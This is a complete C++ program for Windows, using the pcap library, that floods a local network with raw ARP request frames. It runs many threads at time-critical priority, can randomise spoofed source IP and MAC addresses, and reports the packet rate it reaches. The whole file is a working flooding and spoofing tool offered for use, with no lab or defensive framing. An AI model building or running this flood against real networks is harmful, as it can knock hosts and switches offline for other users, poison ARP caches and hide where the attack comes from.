// g++ -O2 -g arp.cpp -o arp.exe -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
#define HAVE_REMOTE
#include <pcap.h>
#include <iostream>
#include <thread>
#include <atomic>
#include <memory>
#include <vector>
#include <chrono>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <cstdio>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#pragma pack(push, 1)
struct ether_header {
    uint8_t  ether_dhost[6];
    uint8_t  ether_shost[6];
    uint16_t ether_type;
};
struct arp_header {
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t opcode;
    uint8_t  sender_mac[6];
    uint8_t  sender_ip[4];
    uint8_t  target_mac[6];
    uint8_t  target_ip[4];
};
#pragma pack(pop)

// ------------------------------------------------------------
// Utility functions
// ------------------------------------------------------------
bool get_local_mac_ipv4(uint32_t ip, uint8_t mac[6]) {
    DWORD dwSize = 0;
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    if (GetAdaptersInfo(nullptr, &dwSize) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
        if (GetAdaptersInfo(pAdapterInfo, &dwSize) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                IP_ADDR_STRING* pIp = &pAdapter->IpAddressList;
                while (pIp) {
                    if (inet_addr(pIp->IpAddress.String) == ip) {
                        memcpy(mac, pAdapter->Address, 6);
                        free(pAdapterInfo);
                        return true;
                    }
                    pIp = pIp->Next;
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }
    return false;
}

std::string get_interface_name_ipv4(uint32_t ip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *dev;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1)
        return "";
    for (dev = alldevs; dev; dev = dev->next) {
        pcap_addr_t *addr;
        for (addr = dev->addresses; addr; addr = addr->next) {
            if (addr->addr && addr->addr->sa_family == AF_INET) {
                struct sockaddr_in *sin = (struct sockaddr_in*)addr->addr;
                if (sin->sin_addr.s_addr == ip) {
                    std::string name = dev->name;
                    pcap_freealldevs(alldevs);
                    return name;
                }
            }
        }
    }
    pcap_freealldevs(alldevs);
    return "";
}

bool parse_mac_strict(const char* str, uint8_t mac[6]) {
    unsigned int tmp[6] = {};
    int consumed = 0;
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x%n", &tmp[0],&tmp[1],&tmp[2],&tmp[3],&tmp[4],&tmp[5],&consumed) != 6)
        return false;
    if (str[consumed] != '\0') return false;
    for (int i = 0; i < 6; ++i) mac[i] = static_cast<uint8_t>(tmp[i]);
    return true;
}

void print_mac(const uint8_t mac[6]) {
    for (int i = 0; i < 6; ++i) { if (i) printf(":"); printf("%02X", mac[i]); }
    printf("\n");
}

// ------------------------------------------------------------
// Prebuilt ARP packet
// ------------------------------------------------------------
class PrebuiltPacketARP {
public:
    static constexpr size_t SIZE = sizeof(ether_header) + sizeof(arp_header);
    alignas(64) uint8_t buffer[SIZE];
    size_t src_mac_offset;
    size_t src_ip_offset;

    PrebuiltPacketARP(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac) {
        memset(buffer, 0, SIZE);
        ether_header* eth = (ether_header*)buffer;
        memcpy(eth->ether_dhost, dst_mac, 6);
        memcpy(eth->ether_shost, src_mac, 6);
        eth->ether_type = htons(0x0806);

        arp_header* arp = (arp_header*)(buffer + sizeof(ether_header));
        arp->htype = htons(1);
        arp->ptype = htons(0x0800);
        arp->hlen = 6;
        arp->plen = 4;
        arp->opcode = htons(1);
        memcpy(arp->sender_mac, src_mac, 6);
        memcpy(arp->sender_ip, &src_ip, 4);
        memcpy(arp->target_ip, &dst_ip, 4);
        // target_mac is zero

        src_mac_offset = offsetof(ether_header, ether_shost);
        src_ip_offset = sizeof(ether_header) + offsetof(arp_header, sender_ip);
    }

    void set_src_mac(const uint8_t mac[6]) {
        memcpy(buffer + src_mac_offset, mac, 6);
        memcpy(buffer + sizeof(ether_header) + offsetof(arp_header, sender_mac), mac, 6);
    }

    void set_src_ip(uint32_t ip) {
        *(uint32_t*)(buffer + src_ip_offset) = ip;
    }
};

// ------------------------------------------------------------
// Flood engine
// ------------------------------------------------------------
class FloodEngineARP {
    pcap_t* pcap_handle;
    PrebuiltPacketARP packet;
    std::atomic<uint64_t>& total;
    std::atomic<bool>& stop;
    bool random_ip, random_mac;
    uint32_t seed;
    inline uint32_t lcg() { seed = seed * 1664525 + 1013904223; return seed; }

public:
    FloodEngineARP(pcap_t* handle, uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac,
                   int tid, std::atomic<uint64_t>& t, std::atomic<bool>& s, bool rip, bool rmac)
        : pcap_handle(handle), packet(src_ip, src_mac, dst_ip, dst_mac), total(t), stop(s),
          random_ip(rip), random_mac(rmac), seed(time(nullptr) + tid * 123456789) {}

    void start(int core) {
        SetThreadAffinityMask(GetCurrentThread(), 1ULL << core);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
        int iter = 0;
        while (true) {
            if (++iter >= 1024) {
                if (stop.load(std::memory_order_relaxed)) break;
                iter = 0;
            }
            if (random_ip) {
                uint32_t rip = lcg();
                rip &= 0xFEFFFFFF;
                packet.set_src_ip(rip);
            }
            if (random_mac) {
                uint8_t mac[6];
                uint64_t r = lcg(); r = (r << 32) | lcg();
                memcpy(mac, &r, 6);
                mac[0] &= 0xFE;
                packet.set_src_mac(mac);
            }
            if (pcap_sendpacket(pcap_handle, packet.buffer, PrebuiltPacketARP::SIZE) == 0)
                total.fetch_add(1, std::memory_order_relaxed);
        }
    }
};

// ------------------------------------------------------------
// main
// ------------------------------------------------------------
int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cerr << "Usage: arp.exe <src_ip> <dst_ip> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac]\n";
        return 1;
    }
    uint32_t src_ip = inet_addr(argv[1]);
    uint32_t dst_ip = inet_addr(argv[2]);
    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);

    uint8_t dst_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool random_ip = false, random_mac = false;
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--random-ip") == 0) random_ip = true;
        else if (strcmp(argv[i], "--random-mac") == 0) random_mac = true;
        else parse_mac_strict(argv[i], dst_mac);
    }

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_init(PCAP_CHAR_ENC_UTF_8, errbuf);

    std::string ifname = get_interface_name_ipv4(src_ip);
    if (ifname.empty()) { std::cerr << "Interface not found\n"; return 1; }
    uint8_t src_mac[6] = {0};
    if (!random_mac && !get_local_mac_ipv4(src_ip, src_mac)) { std::cerr << "Cannot get local MAC\n"; return 1; }

    pcap_t* temp = pcap_open(ifname.c_str(), 65536, 0, 1000, nullptr, errbuf);
    if (!temp || pcap_datalink(temp) != DLT_EN10MB) { std::cerr << "Link error\n"; return 1; }
    pcap_close(temp);

    std::vector<pcap_t*> handles;
    for (int i = 0; i < threads; i++) {
        pcap_t* h = pcap_open(ifname.c_str(), 65536, 0, 1000, nullptr, errbuf);
        if (!h) { for (auto hh : handles) pcap_close(hh); return 1; }
        handles.push_back(h);
    }

    std::atomic<uint64_t> total(0);
    std::atomic<bool> stop(false);
    std::vector<std::thread> workers;
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD cores = si.dwNumberOfProcessors;

    auto start = std::chrono::steady_clock::now();
    for (int i = 0; i < threads; i++) {
        auto eng = std::make_unique<FloodEngineARP>(handles[i], src_ip, src_mac, dst_ip, dst_mac, i, total, stop, random_ip, random_mac);
        workers.emplace_back(&FloodEngineARP::start, eng.get(), i % cores);
        eng.release();
    }

    if (duration > 0) std::this_thread::sleep_for(std::chrono::seconds(duration));
    else { std::cout << "Press Enter...\n"; std::cin.get(); }
    stop = true;
    for (auto& w : workers) w.join();

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count();
    uint64_t pkts = total.load();
    double pps = pkts * 1000.0 / elapsed;
    double mbps = pps * PrebuiltPacketARP::SIZE * 8 / 1e6;
    std::cout << "Packets: " << pkts << "\nPPS: " << pps << "\nMbps: " << mbps << "\n";
    for (auto h : handles) pcap_close(h);
    return 0;
}